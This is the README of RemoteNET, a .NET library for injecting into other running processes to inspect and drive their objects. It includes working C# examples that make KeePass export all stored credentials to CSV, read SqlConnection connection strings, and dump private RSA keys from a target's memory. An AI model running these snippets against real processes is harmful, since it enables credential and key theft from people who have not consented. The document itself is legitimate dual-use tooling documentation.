![icon](https://raw.githubusercontent.com/theXappy/RemoteNET/main/icon.png)
# RemoteNET [![NuGet][nuget-image]][nuget-link]
This library lets you examine, create and interact with remote objects in other .NET processes.  
The target app doesn't need to be explicitly compiled (or consent) to support it.

Basically this library lets you mess with objects of any other .NET app without asking for permissions :)

### 👉 Try It Now: Download the [RemoteNET Spy](https://github.com/theXappy/rnet-kit) app to see this lib in action! 👈


## **Supported Targets**  
✅ .NET 5/6/7  
✅ .NET Core 3.0/3.1  
✅ .NET Framework 4.5/4.6/4.7/4.8 (incl. subversions)  
✅ MSVC-compiled C++ (experimental)  

## Including the library in your project
There are 2 ways to get the library:

1. Get it [from NuGet][nuget-link]\
-or-
2. Clone this repo, compile then reference `RemoteNET.dll` and `ScubaDiver.API.dll` in your project.

## Compiling

1. Clone
2. Initialize git modules (For `detours.net`)
3. Launch "x64 Native Tools Command Prompt for VS 2022"
4. `cd <<your RemoteNET repo path>>\src`
5. `mkdir detours_build`
6. `cd detours_build`
7. `cmake ..\detours.net`
8. Open `RemoteNET.sln` in Visual Studio
9. Compile the RemoteNET project

## Minimal Working Example
To get the essence of how easy and usefull this library can be, see below a re-implementation of [denandz/KeeFarce](https://github.com/denandz/KeeFarce).  
This example interacts with an open KeePass process and makes it export all credentials to a CSV file.  
```C#
// Gain foothold within the target process
RemoteApp remoteApp = RemoteApp.Connect("KeePass.exe");
RemoteActivator rActivator = remoteApp.Activator;

// Get a remote DocumentManagerEx object
IEnumerable<CandidateObject> candidates = remoteApp.QueryInstances("KeePass.UI.DocumentManagerEx");
RemoteObject remoteDocumentManagerEx = remoteApp.GetRemoteObject(candidates.Single());
dynamic dynamicDocumentManagerEx = remoteDocumentManagerEx.Dynamify();

// Get sensitive properties to dump
dynamic activeDb = dynamicDocumentManagerEx.ActiveDatabase;
dynamic rootGroup = activeDb.RootGroup;

// Create remote PwExportInfo object (Call Ctor)
RemoteObject pwExportInfo = rActivator.CreateInstance("KeePass.DataExchange.PwExportInfo", rootGroup, activeDb, true);

// Create remote KeePassCsv1x (Call Ctor)
RemoteObject keePassCsv1x = rActivator.CreateInstance("KeePass.DataExchange.Formats.KeePassCsv1x");
dynamic dynamicCsvFormatter = keePassCsv1x.Dynamify();

// Creating a remote FileStream object
string tempOutputFile = Path.ChangeExtension(Path.GetTempFileName(), "csv");
RemoteObject exportFileStream = rActivator.CreateInstance(typeof(FileStream), tempOutputFile, FileMode.Create);

// Calling Export method of exporter
dynamicCsvFormatter.Export(pwExportInfo, exportFileStream, null);

// Showing results in default CSV editor.
Console.WriteLine($"Output written to: {tempOutputFile}");
Process.Start(tempOutputFile);
```

## How To Use
This section documents most parts of the library's API which you'll likely need.

### ✳️ Setup
To start playing with a remote process you need to create a `RemoteApp` object like so:
```C#
RemoteApp remoteApp = RemoteApp.Connect("OtherDotNetAppName");
```
If you have multiple processes with such name you can use the overload `Connect(System.Diagnostics.Process p)`;

### ✳️ Getting Existing Remote Objects
First and foremost RemoteNET allows you to find existing objects in the remote app.  
To do so you'll need to search the remote heap.  
Use `RemoteApp.QueryInstances()` to find possible candidate for the desired object and `RemoteApp.GetRemoteObject()` to get a handle of a candidate.  
```C#
IEnumerable<CandidateObject> candidates = remoteApp.QueryInstances("MyApp.PasswordContainer");
RemoteObject passwordContainer = remoteApp.GetRemoteObject(candidates.Single());
```

### ✳️ Creating New Remote Objects
Sometimes the existing objects in the remote app are not enough to do what you want.  
For this reason you can also create new objects remotely.  
Use the `Activator`-lookalike for that cause:
```C#
// Creating a remote StringBuilder with default constructor
RemoteObject remoteSb1 = remoteApp.Activator.CreateInstance(typeof(StringBuilder));

// Creating a remote StringBuilder with the "StringBuilder(string, int)" ctor
RemoteObject remoteSb2 = remoteApp.Activator.CreateInstance(typeof(StringBuilder), "Hello", 100);
```
Note how we used constructor arguments in the second `CreateInstance` call. Those could also be other `RemoteObject`s:
```C#
// Constructing a bew StringBuilder
RemoteObject remoteStringBuilder = remoteApp.Activator.CreateInstance(typeof(StringBuilder));
// Constructing a new StringWriter using the "StringWriter(StringBuilder sb)" ctor
RemoteObject remoteStringWriter = remoteApp.Activator.CreateInstance(typeof(StringWriter), remoteStringBuilder);
```

### ✳️ Reading Remote Fields/Properties
To allow a smooth coding expereince RemoteNET is utilizing a special dynamic object which any `RemoteObject` can turn into.  
This object can be used to access field/properties just if they were field/properties of a local object:
```C#
// Reading the 'Capacity' property of a newly created StringBuilder
RemoteObject remoteStringBuilder = remoteApp.Activator.CreateInstance(typeof(StringBuilder));
dynamic dynamicStringBuilder = remoteStringBuilder.Dynamify();
Console.WriteLine("Remote StringBuilder's Capacity: " + dynamicStringBuilder.Capacity)
```
A more interesting example would be retrieving the `ConnectionString`s of every `SqlConnection` instance:
```C#
var sqlConCandidates = remoteApp.QueryInstances(typeof(SqlConnection));
foreach (CandidateObject candidate in sqlConCandidates)
{
    RemoteObject remoteSqlConnection = remoteApp.GetRemoteObject(candidate);
    dynamic dynamicSqlConnection = remoteSqlConnection.Dynamify();
    Console.WriteLine("ConnectionString: " + dynamicSqlConnection.ConnectionString);
}
```

### ✳️ Invoking Remote Methods
Just like accessing fields, invoking methods can be done on the dynamic objects.  
This fun example dumps all private RSA keys (which are stored in `RSACryptoServiceProvider`s) found in the target's memory:
```C#
Func<byte[], string> ToHex = ba => BitConverter.ToString(ba).Replace("-", "");

// Finding every RSACryptoServiceProvider instance
var rsaProviderCandidates = remoteApp.QueryInstances(typeof(RSACryptoServiceProvider));
foreach (CandidateObject candidateRsa in rsaProviderCandidates)
{
    RemoteObject rsaProv = remoteApp.GetRemoteObject(candidateRsa);
    dynamic dynamicRsaProv = rsaProv.Dynamify();
    // Calling remote `ExportParameters`.
    // First parameter (true) indicates we want the private key.
    Console.WriteLine(" * Key found:");
    dynamic parameters = dynamicRsaProv.ExportParameters(true);
    Console.WriteLine("Modulus: " + ToHex(parameters.Modulus));
    Console.WriteLine("Exponent: " + ToHex(parameters.Exponent));
    Console.WriteLine("D: " + ToHex(parameters.D));
    Console.WriteLine("P: " + ToHex(parameters.P));
    Console.WriteLine("Q: " + ToHex(parameters.Q));
    Console.WriteLine("DP: " + ToHex(parameters.DP));
    Console.WriteLine("DQ: " + ToHex(parameters.DQ));
    Console.WriteLine("InverseQ: " + ToHex(parameters.InverseQ));
}
```
### ✳️ Remote Events
You can also subscribe to/unsubscribe from remote events. The syntax is similar to "normal C#" although not exact:
```C#
CandidateObject cand = remoteApp.QueryInstances("System.IO.FileSystemWatcher").Single();
RemoteObject remoteFileSysWatcher = remoteApp.GetRemoteObject(cand);
dynamic dynFileSysWatcher = remoteFileSysWatcher.Dynamify();
Action<dynamic, dynamic> callback = (dynamic o, dynamic e) => Console.WriteLine("Event Invoked!");
dynFileSysWatcher.Changed += callback;
/* ... Somewhere further ... */
dynFileSysWatcher.Changed -= callback;
```
The limitations:  
1. The parameters for the callback must be `dynamic`s
2. The callback must define the exact number of parameters for that event
3. Lambda expression are not allowed. The callback must be cast to an `Action<...>`.

## TODOs
1. Static members
2. Document "Reflection API" (RemoteType, RemoteMethodInfo, ... )
3. Support other .NET framework CLR versions (Before .NET 4). Currently supports v4.0.30319
4. Document Harmony (prefix/postfix/finalizer hooks)
5. Support more Harmony features


## Thanks
**denandz** for his interesting project **KeeFarce** which was a major inspiration for this project.  
Also, multiple parts of this project are directly taken from KeeFarce (DLL Injection, Bootstrap, IntPtr-to-Object converter).

**icons8** for the "Puppet" icon

**Raymond Chen** for stating this project shouldn't be done in [this blog post from 2010](https://devblogs.microsoft.com/oldnewthing/20100812-00/?p=13163).  
I really like this qoute from the post:
>If you could obtain all instances of a type, the fundamental logic behind computer programming breaks down. It effectively becomes impossible to reason about code because anything could happen to your objects at any time.

[nuget-image]: https://img.shields.io/nuget/v/RemoteNET
[nuget-link]: https://www.nuget.org/packages/RemoteNET/
